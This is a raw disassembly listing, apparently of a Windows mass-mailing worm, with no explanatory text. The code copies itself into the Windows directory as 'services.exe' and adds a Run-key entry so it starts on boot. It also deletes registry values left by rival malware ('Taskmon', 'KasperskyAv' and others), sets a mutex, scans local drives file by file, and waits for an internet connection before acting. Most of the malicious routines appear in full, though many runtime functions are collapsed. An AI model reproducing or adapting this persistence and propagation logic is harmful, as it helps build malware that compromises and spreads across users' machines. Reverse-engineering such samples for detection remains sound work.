.text:00402F03		       cmp     dword_414B68, 27FFh
.text:00402F0D		       pop     ecx
.text:00402F0E		       jg      short loc_402F26
.text:00402F10
.text:00402F10 loc_402F10:			       ; CODE XREF: sub_402DDA+64j
.text:00402F10					       ; sub_402DDA+83j
.text:00402F10		       lea     eax, [ebp+FindFileData]
.text:00402F16		       push    eax	       ; lpFindFileData
.text:00402F17		       push    esi	       ; hFindFile
.text:00402F18		       call    ds:FindNextFileA
.text:00402F1E		       test    eax, eax
.text:00402F20		       jnz     loc_402E2E
.text:00402F26
.text:00402F26 loc_402F26:			       ; CODE XREF: sub_402DDA+134j
.text:00402F26		       push    esi	       ; hFindFile
.text:00402F27		       call    ds:FindClose
.text:00402F2D
.text:00402F2D loc_402F2D:			       ; CODE XREF: sub_402DDA+45j
.text:00402F2D					       ; sub_402DDA+4Ej
.text:00402F2D		       pop     esi
.text:00402F2E		       leave
.text:00402F2F		       retn
.text:00402F2F sub_402DDA      endp
.text:00402F2F
.text:00402F30
.text:00402F30 ; =============== S U B R O U T I N E =======================================
.text:00402F30
.text:00402F30
.text:00402F30 sub_402F30      proc near	       ; CODE XREF: WinMain(x,x,x,x)+92p
.text:00402F30		       push    esi
.text:00402F31		       mov     esi, offset off_407094
.text:00402F36
.text:00402F36 loc_402F36:			       ; CODE XREF: sub_402F30+24j
.text:00402F36		       push    dword ptr [esi] ; lpRootPathName
.text:00402F38		       call    ds:GetDriveTypeA
.text:00402F3E		       cmp     eax, 5
.text:00402F41		       jz      short loc_402F4B
.text:00402F43		       push    dword ptr [esi] ; Source
.text:00402F45		       call    sub_402DDA
.text:00402F4A		       pop     ecx
.text:00402F4B
.text:00402F4B loc_402F4B:			       ; CODE XREF: sub_402F30+11j
.text:00402F4B		       add     esi, 4
.text:00402F4E		       cmp     esi, offset off_4070F4
.text:00402F54		       jl      short loc_402F36
.text:00402F56		       xor     eax, eax
.text:00402F58		       pop     esi
.text:00402F59		       retn
.text:00402F59 sub_402F30      endp
.text:00402F59
.text:00402F5A
.text:00402F5A ; =============== S U B R O U T I N E =======================================
.text:00402F5A
.text:00402F5A ; Attributes: bp-based frame
.text:00402F5A
.text:00402F5A sub_402F5A      proc near	       ; CODE XREF: WinMain(x,x,x,x):loc_4031B4p
.text:00402F5A
.text:00402F5A ExistingFileName= byte ptr -824h
.text:00402F5A var_425	       = byte ptr -425h
.text:00402F5A NewFileName     = byte ptr -424h
.text:00402F5A hKey	       = dword ptr -4
.text:00402F5A
.text:00402F5A		       push    ebp
.text:00402F5B		       mov     ebp, esp
.text:00402F5D		       sub     esp, 824h
.text:00402F63		       push    ebx
.text:00402F64		       push    esi
.text:00402F65		       mov     esi, 400h
.text:00402F6A		       push    edi
.text:00402F6B		       lea     eax, [ebp+ExistingFileName]
.text:00402F71		       push    esi	       ; nSize
.text:00402F72		       xor     edi, edi
.text:00402F74		       push    eax	       ; lpFilename
.text:00402F75		       push    edi	       ; hModule
.text:00402F76		       call    ds:GetModuleFileNameA
.text:00402F7C		       lea     eax, [ebp+NewFileName]
.text:00402F82		       push    esi	       ; uSize
.text:00402F83		       push    eax	       ; lpBuffer
.text:00402F84		       call    ds:GetWindowsDirectoryA
.text:00402F8A		       lea     eax, [ebp+NewFileName]
.text:00402F90		       push    eax	       ; Str
.text:00402F91		       call    _strlen
.text:00402F96		       cmp     [ebp+eax+var_425], 5Ch
.text:00402F9E		       pop     ecx
.text:00402F9F		       jz      short loc_402FB4
.text:00402FA1		       lea     eax, [ebp+NewFileName]
.text:00402FA7		       push    offset Source   ; "\\"
.text:00402FAC		       push    eax	       ; Dest
.text:00402FAD		       call    _strcat
.text:00402FB2		       pop     ecx
.text:00402FB3		       pop     ecx
.text:00402FB4
.text:00402FB4 loc_402FB4:			       ; CODE XREF: sub_402F5A+45j
.text:00402FB4		       lea     eax, [ebp+NewFileName]
.text:00402FBA		       push    offset aServices_exe ; "services.exe"
.text:00402FBF		       push    eax	       ; Dest
.text:00402FC0		       call    _strcat
.text:00402FC5		       pop     ecx
.text:00402FC6		       lea     eax, [ebp+NewFileName]
.text:00402FCC		       pop     ecx
.text:00402FCD		       push    edi	       ; bFailIfExists
.text:00402FCE		       push    eax	       ; lpNewFileName
.text:00402FCF		       lea     eax, [ebp+ExistingFileName]
.text:00402FD5		       push    eax	       ; lpExistingFileName
.text:00402FD6		       call    ds:CopyFileA
.text:00402FDC		       lea     eax, [ebp+NewFileName]
.text:00402FE2		       push    offset aServ    ; " -serv"
.text:00402FE7		       push    eax	       ; Dest
.text:00402FE8		       call    _strcat
.text:00402FED		       mov     esi, ds:RegOpenKeyA
.text:00402FF3		       pop     ecx
.text:00402FF4		       pop     ecx
.text:00402FF5		       lea     eax, [ebp+hKey]
.text:00402FF8		       push    eax	       ; phkResult
.text:00402FF9		       mov     ebx, 80000002h
.text:00402FFE		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:00403003		       push    ebx	       ; hKey
.text:00403004		       call    esi ; RegOpenKeyA
.text:00403006		       lea     eax, [ebp+NewFileName]
.text:0040300C		       push    eax	       ; Str
.text:0040300D		       call    _strlen
.text:00403012		       pop     ecx
.text:00403013		       push    eax	       ; cbData
.text:00403014		       lea     eax, [ebp+NewFileName]
.text:0040301A		       push    eax	       ; lpData
.text:0040301B		       push    1	       ; dwType
.text:0040301D		       push    edi	       ; Reserved
.text:0040301E		       push    offset ValueName	; "service"
.text:00403023		       push    [ebp+hKey]      ; hKey
.text:00403026		       call    ds:RegSetValueExA
.text:0040302C		       push    [ebp+hKey]      ; hKey
.text:0040302F		       mov     edi, ds:RegCloseKey
.text:00403035		       call    edi ; RegCloseKey
.text:00403037		       lea     eax, [ebp+hKey]
.text:0040303A		       push    eax	       ; phkResult
.text:0040303B		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:00403040		       push    ebx	       ; hKey
.text:00403041		       call    esi ; RegOpenKeyA
.text:00403043		       mov     ebx, ds:RegDeleteValueA
.text:00403049		       push    offset aTaskmon ; "Taskmon"
.text:0040304E		       push    [ebp+hKey]      ; hKey
.text:00403051		       call    ebx ; RegDeleteValueA
.text:00403053		       push    [ebp+hKey]      ; hKey
.text:00403056		       call    edi ; RegCloseKey
.text:00403058		       lea     eax, [ebp+hKey]
.text:0040305B		       push    eax	       ; phkResult
.text:0040305C		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:00403061		       push    80000001h       ; hKey
.text:00403066		       call    esi ; RegOpenKeyA
.text:00403068		       push    offset aTaskmon ; "Taskmon"
.text:0040306D		       push    [ebp+hKey]      ; hKey
.text:00403070		       call    ebx ; RegDeleteValueA
.text:00403072		       push    [ebp+hKey]      ; hKey
.text:00403075		       call    edi ; RegCloseKey
.text:00403077		       push    offset aClsidE6fb5e20D ;	"CLSID\\{E6FB5E20-DE35-11CF-9C87-00AA0051"...
.text:0040307C		       push    80000000h       ; hKey
.text:00403081		       call    ds:RegDeleteKeyA
.text:00403087		       lea     eax, [ebp+hKey]
.text:0040308A		       push    eax	       ; phkResult
.text:0040308B		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:00403090		       push    80000002h       ; hKey
.text:00403095		       call    esi ; RegOpenKeyA
.text:00403097		       push    offset aExplorer	; "Explorer"
.text:0040309C		       push    [ebp+hKey]      ; hKey
.text:0040309F		       call    ebx ; RegDeleteValueA
.text:004030A1		       push    [ebp+hKey]      ; hKey
.text:004030A4		       call    edi ; RegCloseKey
.text:004030A6		       lea     eax, [ebp+hKey]
.text:004030A9		       push    eax	       ; phkResult
.text:004030AA		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:004030AF		       push    80000001h       ; hKey
.text:004030B4		       call    esi ; RegOpenKeyA
.text:004030B6		       push    offset aExplorer	; "Explorer"
.text:004030BB		       push    [ebp+hKey]      ; hKey
.text:004030BE		       call    ebx ; RegDeleteValueA
.text:004030C0		       push    [ebp+hKey]      ; hKey
.text:004030C3		       call    edi ; RegCloseKey
.text:004030C5		       lea     eax, [ebp+hKey]
.text:004030C8		       push    eax	       ; phkResult
.text:004030C9		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:004030CE		       push    80000002h       ; hKey
.text:004030D3		       call    esi ; RegOpenKeyA
.text:004030D5		       push    offset aKasperskyav ; "KasperskyAv"
.text:004030DA		       push    [ebp+hKey]      ; hKey
.text:004030DD		       call    ebx ; RegDeleteValueA
.text:004030DF		       push    [ebp+hKey]      ; hKey
.text:004030E2		       call    edi ; RegCloseKey
.text:004030E4		       lea     eax, [ebp+hKey]
.text:004030E7		       push    eax	       ; phkResult
.text:004030E8		       push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:004030ED		       push    80000002h       ; hKey
.text:004030F2		       call    esi ; RegOpenKeyA
.text:004030F4		       push    offset aSystem_ ; "system."
.text:004030F9		       push    [ebp+hKey]      ; hKey
.text:004030FC		       call    ebx ; RegDeleteValueA
.text:004030FE		       push    [ebp+hKey]      ; hKey
.text:00403101		       call    edi ; RegCloseKey
.text:00403103		       lea     eax, [ebp+hKey]
.text:00403106		       push    eax	       ; phkResult
.text:00403107		       push    offset aSoftwareMicr_0 ;	"SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
.text:0040310C		       push    80000002h       ; hKey
.text:00403111		       call    esi ; RegOpenKeyA
.text:00403113		       push    offset aSystem_ ; "system."
.text:00403118		       push    [ebp+hKey]      ; hKey
.text:0040311B		       call    ebx ; RegDeleteValueA
.text:0040311D		       push    [ebp+hKey]      ; hKey
.text:00403120		       call    edi ; RegCloseKey
.text:00403122		       pop     edi
.text:00403123		       pop     esi
.text:00403124		       pop     ebx
.text:00403125		       leave
.text:00403126		       retn
.text:00403126 sub_402F5A      endp
.text:00403126
.text:00403127
.text:00403127 ; =============== S U B R O U T I N E =======================================
.text:00403127
.text:00403127 ; Attributes: bp-based frame
.text:00403127
.text:00403127 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
.text:00403127 _WinMain@16     proc near	       ; CODE XREF: start+C9p
.text:00403127
.text:00403127 var_1A8	       = dword ptr -1A8h
.text:00403127 WSAData	       = WSAData ptr -198h
.text:00403127 dwFlags	       = dword ptr -8
.text:00403127 var_4	       = dword ptr -4
.text:00403127 hInstance       = dword ptr  8
.text:00403127 hPrevInstance   = dword ptr  0Ch
.text:00403127 lpCmdLine       = dword ptr  10h
.text:00403127 nShowCmd	       = dword ptr  14h
.text:00403127
.text:00403127		       push    ebp
.text:00403128		       mov     ebp, esp
.text:0040312A		       sub     esp, 198h
.text:00403130		       push    ebx
.text:00403131		       push    esi
.text:00403132		       push    edi
.text:00403133		       call    ds:GetTickCount
.text:00403139		       push    eax	       ; lpName
.text:0040313A		       call    sub_401CD5
.text:0040313F		       xor     esi, esi
.text:00403141		       mov     [esp+1A8h+var_1A8], offset aAdmmoodownjkls ; "AdmMoodownJklS003"
.text:00403148		       push    esi	       ; bInitialOwner
.text:00403149		       push    esi	       ; lpMutexAttributes
.text:0040314A		       call    ds:CreateMutexA
.text:00403150		       mov     dword_414B64, eax
.text:00403155		       call    ds:GetLastError
.text:0040315B		       cmp     eax, 0B7h
.text:00403160		       jnz     short loc_40316B
.text:00403162		       pop     edi
.text:00403163		       pop     esi
.text:00403164		       xor     eax, eax
.text:00403166		       pop     ebx
.text:00403167		       leave
.text:00403168		       retn    10h
.text:0040316B ; ---------------------------------------------------------------------------
.text:0040316B
.text:0040316B loc_40316B:			       ; CODE XREF: WinMain(x,x,x,x)+39j
.text:0040316B		       lea     eax, [ebp+WSAData]
.text:00403171		       push    eax	       ; lpWSAData
.text:00403172		       push    101h	       ; wVersionRequested
.text:00403177		       call    ds:WSAStartup
.text:0040317D		       mov     ecx, 9FFh
.text:00403182		       xor     eax, eax
.text:00403184		       mov     edi, offset byte_408260
.text:00403189		       push    [ebp+lpCmdLine] ; Str
.text:0040318C		       rep stosd
.text:0040318E		       stosw
.text:00403190		       stosb
.text:00403191		       mov     dword_414B68, esi
.text:00403197		       call    _strlen
.text:0040319C		       test    eax, eax
.text:0040319E		       pop     ecx
.text:0040319F		       ja      short loc_4031B4
.text:004031A1		       push    10h	       ; uType
.text:004031A3		       push    offset Caption  ; "Error"
.text:004031A8		       push    offset Text     ; "The file could not be	opened!"
.text:004031AD		       push    esi	       ; hWnd
.text:004031AE		       call    ds:MessageBoxA
.text:004031B4
.text:004031B4 loc_4031B4:			       ; CODE XREF: WinMain(x,x,x,x)+78j
.text:004031B4		       call    sub_402F5A
.text:004031B9		       call    sub_402F30
.text:004031BE		       mov     esi, ds:Sleep
.text:004031C4		       mov     edi, ds:InternetGetConnectedState
.text:004031CA
.text:004031CA loc_4031CA:			       ; CODE XREF: WinMain(x,x,x,x)+B8j
.text:004031CA					       ; WinMain(x,x,x,x)+C0j ...
.text:004031CA		       push    32h	       ; dwMilliseconds
.text:004031CC		       call    esi ; Sleep
.text:004031CE		       xor     ebx, ebx
.text:004031D0		       lea     eax, [ebp+dwFlags]
.text:004031D3		       push    ebx	       ; dwReserved
.text:004031D4		       push    eax	       ; lpdwFlags
.text:004031D5		       mov     [ebp+dwFlags], ebx
.text:004031D8		       call    edi ; InternetGetConnectedState
.text:004031DA		       cmp     eax, ebx
.text:004031DC		       mov     [ebp+var_4], eax
.text:004031DF		       jz      short loc_4031CA
.text:004031E1		       cmp     dword_414B68, ebx
.text:004031E7		       jle     short loc_4031CA
.text:004031E9		       mov     [ebp+lpCmdLine],	offset hFile
.text:004031F0
.text:004031F0 loc_4031F0:			       ; CODE XREF: WinMain(x,x,x,x)+108j
.text:004031F0		       cmp     [ebp+var_4], 1
.text:004031F4		       jnz     short loc_4031CA
.text:004031F6		       cmp     byte_408260[ebx], 0
.text:004031FD		       jnz     short loc_403215
.text:004031FF		       mov     eax, [ebp+lpCmdLine]
.text:00403202		       push    dword ptr [eax] ; hFile
.text:00403204		       call    sub_401D65
.text:00403209		       test    eax, eax
.text:0040320B		       pop     ecx
.text:0040320C		       jz      short loc_403215
.text:0040320E		       mov     byte_408260[ebx], 1
.text:00403215
.text:00403215 loc_403215:			       ; CODE XREF: WinMain(x,x,x,x)+D6j
.text:00403215					       ; WinMain(x,x,x,x)+E5j
.text:00403215		       lea     eax, [ebp+dwFlags]
.text:00403218		       push    0	       ; dwReserved
.text:0040321A		       push    eax	       ; lpdwFlags
.text:0040321B		       call    edi ; InternetGetConnectedState
.text:0040321D		       push    32h	       ; dwMilliseconds
.text:0040321F		       mov     [ebp+var_4], eax
.text:00403222		       call    esi ; Sleep
.text:00403224		       add     [ebp+lpCmdLine],	4
.text:00403228		       inc     ebx
.text:00403229		       cmp     ebx, dword_414B68
.text:0040322F		       jl      short loc_4031F0
.text:00403231		       jmp     short loc_4031CA
.text:00403231 _WinMain@16     endp
.text:00403231
.text:00403231 ; ---------------------------------------------------------------------------
.text:00403233		       align 4
.text:00403234 ; [00000006 BYTES: COLLAPSED FUNCTION GetNetworkParams. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:0040323A		       align 10h
.text:00403240 ; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403298 ; [0000000E BYTES: COLLAPSED FUNCTION operator new(uint). PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004032A6		       align 10h
.text:004032B0 ; [00000335 BYTES: COLLAPSED FUNCTION _memcpy. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004035E5		       align 10h
.text:004035F0 ; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004035F7		       align 10h
.text:00403600 ; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004036E0 ; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040375B		       align 10h
.text:00403760 ; [000000FE BYTES: COLLAPSED FUNCTION _strncpy. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:0040385E ; [0000000B BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403869		       align 10h
.text:00403870 ; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040389F ; [00000028 BYTES: COLLAPSED FUNCTION _isdigit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:004038C7 ; [0000002E BYTES: COLLAPSED FUNCTION _isalnum. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:004038F5		       align 10h
.text:00403900 ; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403980 ; ---------------------------------------------------------------------------
.text:00403980 ; [00000005 BYTES: COLLAPSED CHUNK OF FUNCTION _strchr. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:00403985		       align 10h
.text:00403990 ; [000000BC BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403A4C		       align 10h
.text:00403A50 ; [00000084 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403AD4 ; [000000D7 BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403BAB ; ---------------------------------------------------------------------------
.text:00403BAB		       mov     eax, [ebp-14h]
.text:00403BAE		       mov     ecx, [eax]
.text:00403BB0		       mov     ecx, [ecx]
.text:00403BB2		       mov     [ebp-68h], ecx
.text:00403BB5		       push    eax
.text:00403BB6		       push    ecx
.text:00403BB7		       call    __XcptFilter
.text:00403BBC		       pop     ecx
.text:00403BBD		       pop     ecx
.text:00403BBE		       retn
.text:00403BBF ; ---------------------------------------------------------------------------
.text:00403BBF		       mov     esp, [ebp-18h]
.text:00403BC2		       push    dword ptr [ebp-68h]
.text:00403BC5		       call    __exit
.text:00403BCA ; [00000022 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
.text:00403BEC ; ---------------------------------------------------------------------------
.text:00403BEC		       pop     ecx
.text:00403BED		       pop     ecx
.text:00403BEE		       retn
.text:00403BEF ; [00000023 BYTES: COLLAPSED FUNCTION _fast_error_exit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:00403C12 ; ---------------------------------------------------------------------------
.text:00403C12		       retn
.text:00403C13 ; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403C25 ; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
.text:00403C51 ; [00000036 BYTES: COLLAPSED FUNCTION __heap_alloc. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00403C87 ; [0000002F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403CB6 ; [00000075 BYTES: COLLAPSED FUNCTION __isctype.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403D2B ; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403D58 ; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403D69 ; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403D7A ; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403E13 ; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00403E2D ; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00403F6E ; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
.text:00403FB1 ; [00000058 BYTES: COLLAPSED FUNCTION __wincmdln. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00404009 ; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004040C2 ; [00000099 BYTES: COLLAPSED FUNCTION __setargv.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040415B ; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040430F ; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00404441 ; [000001AB BYTES: COLLAPSED FUNCTION __ioinit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:004045EC ; [0000003C BYTES: COLLAPSED FUNCTION __heap_init. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
.text:00404628 ; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:00404648 ; [00000022 BYTES: COLLAPSED FUNCTION __unwind_handler. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:0040466A ; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004046D2 ; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004046F5 ; ---------------------------------------------------------------------------
.text:004046F5
.text:004046F5 __NLG_Notify1:
.text:004046F5		       push    ebx
.text:004046F6		       push    ecx
.text:004046F7		       mov     ebx, offset dword_4080B4
.text:004046FC		       jmp     short loc_404708
.text:004046FE ; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00404716		       align 4
.text:00404718		       push    esi
.text:00404719		       inc     ebx
.text:0040471A		       xor     dh, [eax]
.text:0040471C		       pop     eax
.text:0040471D		       inc     ebx
.text:0040471E		       xor     [eax], dh
.text:00404720 ; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_1.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004047DD ; ---------------------------------------------------------------------------
.text:004047DD
.text:004047DD unknown_libname_2:		       ; Microsoft VisualC 2-10/net runtime
.text:004047DD		       push    ebp
.text:004047DE		       mov     ecx, [esp+8]
.text:004047E2		       mov     ebp, [ecx]
.text:004047E4		       mov     eax, [ecx+1Ch]
.text:004047E7		       push    eax
.text:004047E8		       mov     eax, [ecx+18h]
.text:004047EB		       push    eax
.text:004047EC		       call    __local_unwind2
.text:004047F1		       add     esp, 8
.text:004047F4		       pop     ebp
.text:004047F5		       retn    4
.text:004047F8 ; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00404831 ; [00000153 BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00404984 ; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040499F ; [0000003E BYTES: COLLAPSED FUNCTION ___sbh_heap_init. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:004049DD ; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00404A08 ; [0000032B BYTES: COLLAPSED FUNCTION ___sbh_free_block.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00404D33 ; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040503C ; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004050ED ; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004051E8 ; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00405331 ; [00000011 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
.text:00405342 ; [00000031 BYTES: COLLAPSED FUNCTION _x_ismbbtype. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00405373 ; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:0040550C ; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD	CTRL-"+" TO EXPAND]
.text:00405556 ; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00405589 ; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:004055B2 ; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
.text:00405737 ; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00405753 ; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:004057DC		       align 10h
.text:004057E0 ; [00000335 BYTES: COLLAPSED FUNCTION _memcpy_0.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00405B15 ; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00405D39 ; [0000002B BYTES: COLLAPSED FUNCTION _strncnt. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:00405D64		       align 10h
.text:00405D70 ; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind.	PRESS KEYPAD CTRL-"+" TO EXPAND]
.text:00405D76 ; [0000009E BYTES: COLLAPSED FUNCTION __strlwr. PRESS KEYPAD CTRL-"+" TO	EXPAND]
.text:00405E14		       align 200h
.text:00405E14 _text	       ends
.text:00405E14
